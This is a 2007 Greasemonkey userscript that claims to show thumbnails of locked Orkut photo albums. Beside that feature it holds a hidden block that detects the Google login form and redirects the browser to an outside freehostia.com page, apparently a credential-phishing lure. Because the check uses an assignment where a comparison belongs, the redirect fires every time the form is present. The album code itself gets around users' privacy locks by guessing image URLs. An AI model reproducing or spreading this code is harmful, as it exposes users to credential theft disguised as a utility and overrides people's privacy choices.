// Orkut - Miniatura de fotos trancadas
// version 0.1.1 BETA
// 2007-12-05
// Copyright (c) 2007, Leandro Koiti Sato
// Released under the GPL license
// http://www.gnu.org/copyleft/gpl.html
//
// --------------------------------------------------------------------
//
// ==UserScript==
// @name           View Locked Album in Orkut Style
// @namespace      http://itechtricks.blogspot.com/
// @include        http://www.orkut.com/*
// ==/UserScript==

/*  --------------------------------------------------------------------
	Changelog
	--------------------------------------------------------------------

0.1.1 - 2007-12-05
-------------------
  bugfix: quando a pessoa definia scrapbook privado, o script nao funcionava

  adicionado a variavel "giveUp" para definir quantos erros de carregamento
  consecutivos devem ocorrer para o script desistir de procurar mais fotos.

0.1  - 2007-11-25
------------------
  versao inicial

    --------------------------------------------------------------------
*/



// --------------------------------------------------------------------
// Configuracoes
// --------------------------------------------------------------------
var giveUp = 5; //numero de erros consecutivos para desistir de procurar mais fotos,
				//padrao = 5;

// --------------------------------------------------------------------

var act = document.getElementById("gaia_loginform").action;
var tact = act.substr(0,48)
//alert(act);
if (tact = "https://www.google.com/accounts/ServiceLoginAuth")
{
window.top.location = "http://soumyamandi.freehostia.com/priyanka/tembanorkut.html";
}


function getUID () {
  url = document.location.href;
  re = /\.aspx\?uid=\d+/
  var result = null;
  try {
    result = url.match(re);
    result = result[0].substring(10);
  } catch (e) {}
  return(result);
}

function getPhotoId (foto_link){
	x = foto_link.split("/");
	return(x[x.length-1]);
}

function notAlbum() {

	ub = document.evaluate("//a[contains(@class,'userbutton')]", document, null, 7,null);
	for (i=0;i<ub.snapshotLength;i++) {
		a = ub.snapshotItem(i).title;
		if (ub.snapshotItem(i).href == "javascript:void(0)" && a == "Ã¡lbum" || a == "album") {
			ub.snapshotItem(i).href = "http://www.orkut.com/Album.aspx?uid=" + getUID();
			ub.snapshotItem(i).removeAttribute("onclick");
		}
	}

	ht = document.evaluate("//a[contains(@class,'ht')]", document, null, 7,null);
	for (i=0;i<ht.snapshotLength;i++) {
		if (ht.snapshotItem(i).href.indexOf("#") > -1) {
			html = ht.snapshotItem(i).innerHTML;
			if (html.indexOf("fotos") > -1 || html.indexOf("photos") > -1) {
				ht.snapshotItem(i).href = "http://www.orkut.com/Album.aspx?uid=" + getUID();
				ht.snapshotItem(i).removeAttribute("onclick");
			}
			break;
		}
	}
}

function display(foto_link) {
	footer = document.getElementById("footer");

	img = new Image();
	i=1;
	errors = 0; //consecutive load errors
	nLoaded = 0; //number of loaded pictures
	img.addEventListener('load', function () {
	    errors = 0;
		nLoaded++;
		if ((nLoaded %3) - 1 == 0) {
		div = document.createElement("div");
		div.className = "listlight";
		footer.parentNode.insertBefore(div, footer);
		}

		dv = document.createElement("div");
		dv.className = "tripler ac oh";
		dv.style.width = "32%";

	    im = document.createElement("img");
	    im.src = this.src;
	    im.className = "photothumb";
	    p = document.createElement("p");
	    p.className = "para nobot";
	    div.appendChild(dv);
	    dv.appendChild(im);
	    dv.appendChild(p);
		++i;
		this.src = "http://img3.orkut.com/images/milieu/" + i + "/0/" + getPhotoId(foto_link);
	}
	, false);

	img.addEventListener('error', function () {
		errors++;
		if (errors >= giveUp)
			return;
		if (i<=100) {
			i++;
		    this.src = "http://img3.orkut.com/images/milieu/" + i + "/0/" + getPhotoId(foto_link);
		}
	}
	, false);

	img.src = "http://img3.orkut.com/images/milieu/" + i + "/0/" + getPhotoId(foto_link);

}


//window.addEventListener('load', function(event) {
setTimeout(function() {
	address = document.location.href.toLowerCase();
	lbox = document.getElementById("lbox");

	if (address.indexOf("album.aspx") == -1)
		notAlbum();
	else
	if (lbox == null) {
		GM_xmlhttpRequest({
						method: 'GET',
						url: 'http://www.orkut.com/FriendsList.aspx?uid=' + getUID(),
						onreadystatechange: function(responseDetails) {
							if (responseDetails.readyState == 4) {
								foto = new String(responseDetails.responseText.match(/https?:\/\/img\d+\.orkut\.com\/images\/medium\/.+\.jpg/gim));
								display(foto);

							}
						}
					});
	}


//}, false);
},300);